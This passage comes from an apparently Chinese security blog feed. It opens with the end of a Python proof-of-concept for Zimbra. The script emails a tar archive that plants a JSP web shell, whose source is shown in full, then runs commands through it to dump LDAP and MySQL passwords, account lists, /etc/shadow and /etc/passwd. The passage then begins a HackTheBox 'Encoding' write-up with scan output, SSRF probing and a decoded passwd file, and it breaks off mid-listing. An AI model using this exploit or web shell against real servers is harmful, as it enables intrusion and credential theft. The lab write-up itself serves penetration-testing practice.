smtp_server.sendmail(sender, recipient, msg.as_string())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        webshell_payload = <span class="string">b&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">        self.webshellPass = <span class="string">&#x27;sMuw1P2&#x27;</span></span><br><span class="line">        target = self.host</span><br><span class="line">        webshell_path = <span class="string">&#x27;/public/jsp&#x27;</span></span><br><span class="line">        self.webshellName = <span class="string">&#x27;Startup1_3.jsp&#x27;</span></span><br><span class="line">        attachment = <span class="string">&#x27;helloWorld.tar&#x27;</span></span><br><span class="line">        b = <span class="built_in">str</span>(self.host).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(b)):</span><br><span class="line">            <span class="keyword">if</span> i != <span class="built_in">len</span>(b) - <span class="number">1</span>:</span><br><span class="line">                domain = domain + b[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                domain = domain + b[i]</span><br><span class="line">        recipient = <span class="string">&#x27;admin@&#x27;</span> + domain</span><br><span class="line">        email_subject = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">        email_body = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">        upload_base = <span class="string">&#x27;/opt/zimbra/jetty_base/webapps/zimbra&#x27;</span></span><br><span class="line">        tar = self.create_tar_payload(webshell_payload, self.webshellName, upload_base+webshell_path)</span><br><span class="line">        sender = <span class="string">&#x27;anonymous@&#x27;</span> + domain</span><br><span class="line">        self.smtp_send_file(target, sender, recipient, email_subject, email_body, tar, attachment)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        data = &#123;self.webshellPass: command&#125;</span><br><span class="line">        req = requests.post(self.url + <span class="string">&#x27;/public/jsp/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName), data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_Vulnerable</span>(<span class="params">self</span>):</span><br><span class="line">        ranStr2echo = random_str(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> ranStr2echo <span class="keyword">in</span> self.execute_command(<span class="string">&#x27;echo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ranStr2echo)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        r = requests.get(self.url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_version</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmcontrol -v&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_email = re.<span class="built_in">compile</span>(<span class="string">&#x27;av_notify_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            av_notify_user = re.findall(pattern_email, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetAllAccountsRequest</span>(<span class="params">self</span>):</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;(\S*)&#x27;</span>)</span><br><span class="line">        users = re.findall(pattern, self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmprov -l gaa&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> users:</span><br><span class="line">            users.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.upload_webshell()</span><br><span class="line">            <span class="keyword">if</span> self.check_Vulnerable():</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url</span><br><span class="line"></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user = self.get_ldap_and_mysql_Info()</span><br><span class="line">                <span class="comment"># Web网站相关信息</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># 网站默认首页的title信息（可能含有单位或组织信息）</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="string">&quot;version&quot;</span>: self.get_version(),</span><br><span class="line">                    <span class="string">&quot;all accounts&quot;</span>: self.GetAllAccountsRequest(),</span><br><span class="line">                    <span class="comment"># webshell路径及参数名</span></span><br><span class="line">                    <span class="string">&quot;webshell&quot;</span>: &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName),</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: self.webshellPass&#125;,</span><br><span class="line">                    <span class="string">&quot;admin notification emails&quot;</span>: av_notify_user</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># 凭据类信息，针对各类弱口令、默认口令漏洞</span></span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass, <span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address,</span><br><span class="line">                     <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 获取的文件信息, 针对各类文件读取类漏洞</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 命令执行信息, 针对各类命令执行、代码执行漏洞</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a><strong>运行结果</strong></h3><p><a href="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hackthebox]Encoding WriteUp</title>
      <link href="/2023/02/25/htbEncoding/"/>
      <url>/2023/02/25/htbEncoding/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这台机子打了好多天终于成功get root，打起来收获满满，在这里做个详细的记录。目前还是Active的机子，仅作记录，师傅们别举报我-。-</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>nmap扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# nmap -sS -sV -sC -A -p- --min-rate 5000 10.10.11.198 </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 23:45 EST</span><br><span class="line">Nmap scan report for 10.10.11.198 (10.10.11.198)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-title: HaxTables</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.93%E=4%D=2/24%OT=22%CT=1%CU=41355%PV=Y%DS=2%DC=T%G=Y%TM=63F992A</span><br><span class="line">OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS</span><br><span class="line">OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1</span><br><span class="line">OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN</span><br><span class="line">OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A</span><br><span class="line">OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F</span><br><span class="line">OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%</span><br><span class="line">OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD</span><br><span class="line">OS:=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   263.34 ms 10.10.14.1 (10.10.14.1)</span><br><span class="line">2   263.50 ms 10.10.11.198 (10.10.11.198)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 46.74 seconds</span><br></pre></td></tr></table></figure><p>老样子，linux机器开启22和80端口。gobuster扫描目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# gobuster dir -u http://10.10.11.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 -x php </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.4</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.198/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 200</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.4</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/02/24 23:49:04 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 1999]</span><br><span class="line">/.php                 (Status: 403) [Size: 277]</span><br><span class="line">/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.198/assets/]</span><br><span class="line">/includes             (Status: 301) [Size: 315] [--&gt; http://10.10.11.198/includes/]</span><br><span class="line">/handler.php          (Status: 200) [Size: 38]</span><br><span class="line">/.php                 (Status: 403) [Size: 277]</span><br></pre></td></tr></table></figure><p>接着进入站点，发现此处存在子域：</p><p><a href="https://pic.imgdb.cn/item/63f9ccf2f144a010073194d1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ccf2f144a010073194d1.jpg"></a></p><p>写入到hosts:</p><p><a href="https://pic.imgdb.cn/item/63f9cd02f144a0100731b1fb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd02f144a0100731b1fb.jpg"></a></p><p>接着尝试爆破子域：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# ffuf -H &quot;HOST:FUZZ.haxtables.htb&quot; -u http://haxtables.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 50  -fw &quot;246&quot;</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v1.5.0 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://haxtables.htb</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt</span><br><span class="line"> :: Header           : Host: FUZZ.haxtables.htb</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 50</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response words: 246</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">api                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1022ms]</span><br><span class="line">image                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 263ms]</span><br><span class="line">:: Progress: [19966/19966] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:52] :: Errors: 0 :</span><br></pre></td></tr></table></figure><p>一并写入到hosts中。尝试访问image.haxtables.htb显示403：</p><p><a href="https://pic.imgdb.cn/item/63f9cd11f144a0100731c7d3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd11f144a0100731c7d3.jpg"></a></p><p>接着我们继续查看api文档，注意此处：</p><p><a href="https://pic.imgdb.cn/item/63f9cd20f144a0100731daea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd20f144a0100731daea.jpg"></a></p><p>猜测此处存在SSRF，先尝试在本地放置一个1.txt并执行如下python程序查看结果：</p><p><a href="https://pic.imgdb.cn/item/63f9cd31f144a0100731f4ff.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd31f144a0100731f4ff.jpg"></a></p><p>结果如下所示：</p><p><a href="https://pic.imgdb.cn/item/63f9cd43f144a01007321625.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd43f144a01007321625.jpg"></a></p><p>发现成功读取，那我们解码一下即可得到&#x2F;etc&#x2F;passwd的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# echo $(python3 1.py|jq &quot;.data&quot;) &gt; 2.txt &amp;&amp; xxd -r -p 2.txt                  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span 